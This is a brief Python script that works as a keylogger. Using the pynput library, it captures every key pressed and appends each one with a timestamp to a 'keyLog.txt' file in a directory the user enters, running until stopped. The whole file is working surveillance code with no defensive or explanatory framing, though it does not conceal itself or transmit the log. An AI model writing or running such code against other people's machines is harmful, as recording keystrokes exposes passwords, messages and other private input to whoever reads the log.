from pynput.keyboard import Key, Listener
import logging


#Function that logs each key
def on_press(key):
    logging.info(str(key))
    
    
def main():
    #Retrieve location to store log from user
    log_dir = r"{}".format(input("Enter path to save keylog: ").strip())
    logging.basicConfig(filename = (log_dir + "keyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

    #Starting keylogger
    print("Starting Keylog.")
    with Listener(on_press=on_press) as listener:
        listener.join()


if __name__ == "__main__":
    main()